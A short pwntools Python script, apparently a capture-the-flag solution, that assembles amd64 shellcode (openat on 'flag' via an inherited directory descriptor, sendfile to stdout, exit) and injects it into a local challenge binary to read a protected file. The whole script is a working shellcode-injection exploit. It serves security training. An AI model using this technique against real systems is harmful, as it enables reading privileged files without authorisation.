from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

assembly = str()
# open the file 'flag' relative to fd 3 which will be from open('/')
assembly += shellcraft.openat(3, "flag", "O_RDONLY")
# send the opened file to stdout
assembly += shellcraft.sendfile(1, "rax", 0, 0x55)
# exit cleanly
assembly += shellcraft.exit(0)

# the hostname will always be the same as challenge binary

challenge_binary = os.getenv('HOSTNAME')
with process([f"/challenge/{challenge_binary}", "/"]) as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
